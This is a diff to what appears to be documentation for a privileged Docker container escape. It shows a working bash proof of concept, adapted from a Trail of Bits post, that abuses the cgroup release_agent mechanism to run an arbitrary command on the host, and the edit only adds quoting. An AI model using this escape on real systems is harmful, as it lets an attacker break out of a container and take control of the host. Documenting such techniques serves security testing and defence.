@@ -10,18 +10,17 @@ Any docker container running as privileged has sufficient privledges to execute 
 
 The following POC is modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
 ```bash
-  d="$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))"
-  mkdir -p $d/w
-  echo 1 >$d/w/notify_on_release
+  d=$(dirname "$(ls -x /s*/fs/c*/*/r* | head -n1)")
+  mkdir -p "$d/w"
+  echo 1 >"$d/w/notify_on_release"
   t="$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)"
   touch /o
-  echo $t/c >$d/release_agent
+  echo "$t/c" >"$d/release_agent"
   printf "#!/bin/sh\n%s > %s/o" "$cmd" "$t">/c
   chmod +x /c
   sh -c "echo 0 >$d/w/cgroup.procs"
   sleep 1
   cat /o
-
   # Tidy up
   rm /c /o
 ```
